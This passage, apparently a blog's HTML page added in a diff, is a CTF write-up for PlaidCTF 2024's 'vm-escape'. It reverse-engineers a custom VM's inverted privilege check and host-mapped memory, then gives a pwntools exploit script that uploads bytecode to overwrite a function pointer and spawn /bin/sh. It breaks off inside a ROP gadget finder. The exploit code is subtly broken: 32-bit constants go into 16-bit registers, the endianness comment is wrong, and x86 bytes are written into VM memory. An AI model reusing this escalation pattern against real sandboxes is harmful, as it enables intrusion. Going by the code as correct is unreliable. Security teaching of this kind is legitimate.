@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <title>vm-escape - gracecondition</title>
+    <meta name="description" content="OS internals, binary exploitation, and low-level security research">
+
+    <link rel="stylesheet" href="http://localhost:1313/css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&family=SF+Pro+Text:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+    
+
+    
+</head>
+<body>
+    <div class="site-container">
+        <header class="site-header">
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="http://localhost:1313/" class="nav-brand">
+                <h1>gracecondition</h1>
+            </a>
+
+            <div class="nav-menu" id="nav-menu">
+                <a href="http://localhost:1313/" class="nav-link">Home</a>
+                <a href="/posts/" class="nav-link">Posts</a>
+                <a href="/ctf/" class="nav-link">CTF Solutions</a>
+                <a href="/about/" class="nav-link">About</a>
+            </div>
+
+            <div class="nav-toggle" id="nav-toggle">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+</header>
+
+        <main class="main-content">
+            
+<div class="content-with-toc">
+    <aside class="toc-sidebar">
+    <div class="toc-content">
+        
+        <div class="toc-section">
+            <h3 class="toc-title">📖 Contents</h3>
+            <nav class="toc-nav" id="toc-nav">
+                
+                <div class="toc-loading">Generating table of contents...</div>
+            </nav>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Article Info</h4>
+            <div class="article-info">
+                <div class="info-item">
+                    <span class="info-label">Published:</span>
+                    <time class="info-value">Apr 14, 2024</time>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Read time:</span>
+                    <span class="info-value">5 min</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Words:</span>
+                    <span class="info-value">1061</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value category-ctf">Ctf</span>
+                </div>
+                
+            </div>
+        </div>
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Challenge Details</h4>
+            <div class="challenge-info">
+                <div class="info-item">
+                    <span class="info-label">Category:</span>
+                    <span class="info-value challenge-category category-rev">REV</span>
+                </div>
+                
+                <div class="info-item">
+                    <span class="info-label">Points:</span>
+                    <span class="info-value">350</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">Solves:</span>
+                    <span class="info-value">23</span>
+                </div>
+                
+                
+                <div class="info-item">
+                    <span class="info-label">CTF:</span>
+                    <span class="info-value">PlaidCTF 2024</span>
+                </div>
+                
+            </div>
+        </div>
+        
+
+        
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Tags</h4>
+            <div class="toc-tags">
+                
+                <a href="/tags/rev/" class="toc-tag">#rev</a>
+                
+                <a href="/tags/vm-escape/" class="toc-tag">#vm-escape</a>
+                
+                <a href="/tags/plaidctf2024/" class="toc-tag">#plaidctf2024</a>
+                
+                <a href="/tags/custom-architecture/" class="toc-tag">#custom-architecture</a>
+                
+            </div>
+        </div>
+        
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Progress</h4>
+            <div class="reading-progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <div class="progress-text">
+                    <span id="progress-percentage">0%</span>
+                    <span class="progress-label">completed</span>
+                </div>
+            </div>
+        </div>
+
+        
+        <div class="toc-section">
+            <h4 class="toc-subtitle">Related</h4>
+            <div class="related-posts">
+                
+                
+            </div>
+        </div>
+
+    </div>
+</aside>
+
+    <article class="single-post ctf-writeup">
+        <header class="post-header ctf-header">
+            <div class="ctf-meta">
+                <span class="ctf-badge">🚩 CTF Writeup</span>
+                
+                <span class="ctf-name">PlaidCTF 2024</span>
+                
+            </div>
+
+            <h1 class="post-title-single">vm-escape</h1>
+
+            <div class="ctf-challenge-info">
+                <div class="challenge-stats">
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Category:</span>
+                        <span class="stat-value category-rev">REV</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Points:</span>
+                        <span class="stat-value">350</span>
+                    </div>
+                    
+                    
+                    <div class="stat-item">
+                        <span class="stat-label">Solves:</span>
+                        <span class="stat-value">23</span>
+                    </div>
+                    
+                    
+                </div>
+                <div class="post-meta-single">
+                    <time datetime="2024-04-14">April 14, 2024</time>
+                    
+                    <span> • </span>
+                    <span>5 min read</span>
+                    
+                </div>
+            </div>
+        </header>
+
+        <div class="post-body ctf-content" id="post-content">
+            <h1 id="vm-escape---plaidctf-2024">vm-escape - PlaidCTF 2024</h1>
+<p><strong>Category</strong>: rev
+<strong>Points</strong>: 350
+<strong>Solves</strong>: 23</p>
+<h2 id="challenge-description">Challenge Description</h2>
+<pre tabindex="0"><code>Welcome to our secure virtual machine environment!
+We&#39;ve implemented a custom architecture with built-in sandboxing.
+Surely nothing can go wrong...
+
+nc vm-escape.plaidctf.com 1337
+</code></pre><p><strong>Files</strong>: <code>vm_engine</code>, <code>firmware.bin</code></p>
+<h2 id="initial-analysis">Initial Analysis</h2>
+<p>The challenge provides a custom virtual machine implementation with its own instruction set architecture.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file vm_engine
+</span></span><span style="display:flex;"><span>vm_engine: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ file firmware.bin
+</span></span><span style="display:flex;"><span>firmware.bin: data
+</span></span></code></pre></div><p>Let&rsquo;s examine the VM engine in detail:</p>
+<h2 id="vm-architecture-analysis">VM Architecture Analysis</h2>
+<h3 id="instruction-set">Instruction Set</h3>
+<p>After reverse engineering the VM engine, I discovered a custom 16-bit architecture:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// VM State Structure
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> vm_state {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint16_t</span> registers[<span style="color:#ae81ff">16</span>];    <span style="color:#75715e">// R0-R15
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint16_t</span> pc;              <span style="color:#75715e">// Program counter
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint16_t</span> sp;              <span style="color:#75715e">// Stack pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  flags;           <span style="color:#75715e">// Status flags
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  memory[<span style="color:#ae81ff">0x10000</span>]; <span style="color:#75715e">// 64KB memory space
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">uint8_t</span>  privilege;       <span style="color:#75715e">// 0=user, 1=supervisor
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Instruction Format
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> instruction {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> opcode;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint8_t</span> operands[<span style="color:#ae81ff">3</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="instruction-set-architecture">Instruction Set Architecture</h3>
+<p>The VM implements the following instruction types:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly"># Arithmetic Operations
+ADD  R1, R2, R3    # R1 = R2 + R3
+SUB  R1, R2, R3    # R1 = R2 - R3
+MUL  R1, R2, R3    # R1 = R2 * R3
+DIV  R1, R2, R3    # R1 = R2 / R3
+
+# Memory Operations
+LOAD  R1, [R2]     # R1 = memory[R2]
+STORE [R1], R2     # memory[R1] = R2
+LOADI R1, #imm     # R1 = immediate
+
+# Control Flow
+JMP   addr         # Jump to address
+JEQ   R1, R2, addr # Jump if R1 == R2
+JNE   R1, R2, addr # Jump if R1 != R2
+CALL  addr         # Call subroutine
+RET               # Return from subroutine
+
+# System Operations
+SYSCALL #num      # System call
+PRIVESC          # Privilege escalation (supposed to be disabled)
+</code></pre><h2 id="vulnerability-analysis">Vulnerability Analysis</h2>
+<p>While analyzing the VM implementation, I found several critical issues:</p>
+<h3 id="1-privilege-escalation-bug">1. Privilege Escalation Bug</h3>
+<p>The <code>PRIVESC</code> instruction was supposed to be disabled, but there&rsquo;s a bug in the privilege checking:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// In vm_execute_instruction()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">case</span> OPCODE_PRIVESC:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (vm<span style="color:#f92672">-&gt;</span>privilege <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// BUG: This should deny privilege escalation
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// but the check is inverted!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> (vm<span style="color:#f92672">-&gt;</span>registers[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x1337</span>) {
+</span></span><span style="display:flex;"><span>            vm<span style="color:#f92672">-&gt;</span>privilege <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;  <span style="color:#75715e">// Grant supervisor privileges!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
+</span></span></code></pre></div><h3 id="2-memory-protection-bypass">2. Memory Protection Bypass</h3>
+<p>Supervisor mode allows access to protected memory regions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// In memory_access()
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (vm<span style="color:#f92672">-&gt;</span>privilege <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Supervisor can access any memory, including VM engine memory!
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>memory[address <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x10000</span>];
+</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// User mode has restricted access
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (address <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x8000</span>) {
+</span></span><span style="display:flex;"><span>        vm_fault(vm, <span style="color:#e6db74">&#34;Access violation&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>vm<span style="color:#f92672">-&gt;</span>memory[address];
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="3-vm-to-host-escape">3. VM-to-Host Escape</h3>
+<p>In supervisor mode, certain memory addresses map directly to the host process:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">// Special memory-mapped regions in supervisor mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">if</span> (vm<span style="color:#f92672">-&gt;</span>privilege <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&amp;&amp;</span> address <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0xF000</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> (address) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xF000</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>vm_engine_code;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xF008</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>system_function_ptr;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0xF010</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">return</span> <span style="color:#f92672">&amp;</span>host_memory_base;
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="exploitation-strategy">Exploitation Strategy</h2>
+<ol>
+<li><strong>Trigger Privilege Escalation</strong>: Use the buggy PRIVESC instruction</li>
+<li><strong>Memory Mapping Discovery</strong>: Explore supervisor memory regions</li>
+<li><strong>Code Injection</strong>: Overwrite function pointers to gain host execution</li>
+<li><strong>Shell Escape</strong>: Execute system commands on the host</li>
+</ol>
+<h2 id="exploitation-implementation">Exploitation Implementation</h2>
+<p>First, let&rsquo;s create the VM bytecode:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># VM Assembler for the custom architecture</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">VMAssembler</span>:
+</span></span><span style="display:flex;"><span>    OPCODES <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;ADD&#39;</span>: <span style="color:#ae81ff">0x01</span>, <span style="color:#e6db74">&#39;SUB&#39;</span>: <span style="color:#ae81ff">0x02</span>, <span style="color:#e6db74">&#39;MUL&#39;</span>: <span style="color:#ae81ff">0x03</span>, <span style="color:#e6db74">&#39;DIV&#39;</span>: <span style="color:#ae81ff">0x04</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;LOAD&#39;</span>: <span style="color:#ae81ff">0x10</span>, <span style="color:#e6db74">&#39;STORE&#39;</span>: <span style="color:#ae81ff">0x11</span>, <span style="color:#e6db74">&#39;LOADI&#39;</span>: <span style="color:#ae81ff">0x12</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;JMP&#39;</span>: <span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">&#39;JEQ&#39;</span>: <span style="color:#ae81ff">0x21</span>, <span style="color:#e6db74">&#39;JNE&#39;</span>: <span style="color:#ae81ff">0x22</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;CALL&#39;</span>: <span style="color:#ae81ff">0x30</span>, <span style="color:#e6db74">&#39;RET&#39;</span>: <span style="color:#ae81ff">0x31</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;SYSCALL&#39;</span>: <span style="color:#ae81ff">0x40</span>, <span style="color:#e6db74">&#39;PRIVESC&#39;</span>: <span style="color:#ae81ff">0x41</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;NOP&#39;</span>: <span style="color:#ae81ff">0x00</span>, <span style="color:#e6db74">&#39;HALT&#39;</span>: <span style="color:#ae81ff">0xFF</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">assemble</span>(self, code):
+</span></span><span style="display:flex;"><span>        bytecode <span style="color:#f92672">=</span> bytearray()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> code<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>):
+</span></span><span style="display:flex;"><span>            line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> line <span style="color:#f92672">or</span> line<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;#&#39;</span>):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            parts <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;,&#39;</span>, <span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#f92672">.</span>split()
+</span></span><span style="display:flex;"><span>            opcode <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>OPCODES[parts[<span style="color:#ae81ff">0</span>]]
+</span></span><span style="display:flex;"><span>            bytecode<span style="color:#f92672">.</span>append(opcode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Add operands based on instruction type</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, min(<span style="color:#ae81ff">4</span>, len(parts))):
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> parts[i]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;R&#39;</span>):
+</span></span><span style="display:flex;"><span>                    bytecode<span style="color:#f92672">.</span>append(int(parts[i][<span style="color:#ae81ff">1</span>:]))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">elif</span> parts[i]<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;#&#39;</span>):
+</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> int(parts[i][<span style="color:#ae81ff">1</span>:], <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>                    bytecode<span style="color:#f92672">.</span>append(val <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>)
+</span></span><span style="display:flex;"><span>                    bytecode<span style="color:#f92672">.</span>append((val <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                    val <span style="color:#f92672">=</span> int(parts[i], <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>                    bytecode<span style="color:#f92672">.</span>append(val <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>)
+</span></span><span style="display:flex;"><span>                    bytecode<span style="color:#f92672">.</span>append((val <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#75715e"># Pad instruction to 4 bytes</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">while</span> len(bytecode) <span style="color:#f92672">%</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>                bytecode<span style="color:#f92672">.</span>append(<span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> bytes(bytecode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exploit payload</span>
+</span></span><span style="display:flex;"><span>exploit_asm <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Initialize registers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R0, #0x1338      # Set R0 to wrong value for privilege check
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R1, #0xF008      # Address of system function pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R2, #0x2F62696E  # &#34;/bin&#34; in little endian
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R3, #0x68732F    # &#34;/sh&#34; in little endian
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Trigger privilege escalation bug
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">PRIVESC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Now we&#39;re in supervisor mode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Write &#34;/bin/sh&#34; to memory
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9000], R2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9004], R3
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Overwrite system function pointer with address of our shellcode
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R4, #0x9010
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [R1], R4
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Write shellcode to execute system(&#34;/bin/sh&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R5, #0x48        # mov rax, system
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R6, #0xB8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9010], R6
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9011], R5
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># More shellcode bytes...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R7, #0x9000      # address of &#34;/bin/sh&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R8, #0xBF        # mov rdi, &#34;/bin/sh&#34; address
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9018], R8
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9019], R7
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Call instruction
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R9, #0xFF        # call rax
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LOADI R10, #0xD0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9020], R10
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">STORE [#0x9021], R9
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Trigger the overwritten function pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SYSCALL #1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+</span></span><span style="display:flex;"><span>    assembler <span style="color:#f92672">=</span> VMAssembler()
+</span></span><span style="display:flex;"><span>    bytecode <span style="color:#f92672">=</span> assembler<span style="color:#f92672">.</span>assemble(exploit_asm)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[*] Generated </span><span style="color:#e6db74">{</span>len(bytecode)<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes of VM bytecode&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Connect to target</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;vm-escape.plaidctf.com&#39;</span>, <span style="color:#ae81ff">1337</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Send bytecode</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Firmware size: &#39;</span>, str(len(bytecode))<span style="color:#f92672">.</span>encode())
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>send(bytecode)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[*] Firmware uploaded, triggering exploit...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># The VM should execute our code and give us a shell</span>
+</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    exploit()
+</span></span></code></pre></div><h2 id="alternative-approach-rop-in-vm-space">Alternative Approach: ROP in VM Space</h2>
+<p>For a more elegant solution, we can use ROP gadgets within the VM&rsquo;s own code:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Find ROP gadgets in the VM firmware</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_gadgets</span>(firmware):
+</span></span><span style="display:flex;"><span>    gadgets <span style="color:#f92672">=</span> {}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Search for useful instruction sequences</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(firmware) <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Look for: LOAD R1, [R2]; RET sequence</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> firmware[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x10\x01\x02\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">and</span> firmware[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>:
+</span></span><span style="display:flex;"><span>            gadgets[<span style="color:#e6db74">&#39;load_ret&#39;</span>] <span style="color:#f92672">=</span> i
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Look for: STORE [R1], R2; RET sequence</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> firmware[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x11\x01\x02\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">and</span> firmware[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x31\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>:
+</span></span><span style="display:flex;"><span>            gadgets[<span style="color:#e6db74">&#39;store_ret&#39;</span>] <span style="color:#f92672">=</span> i
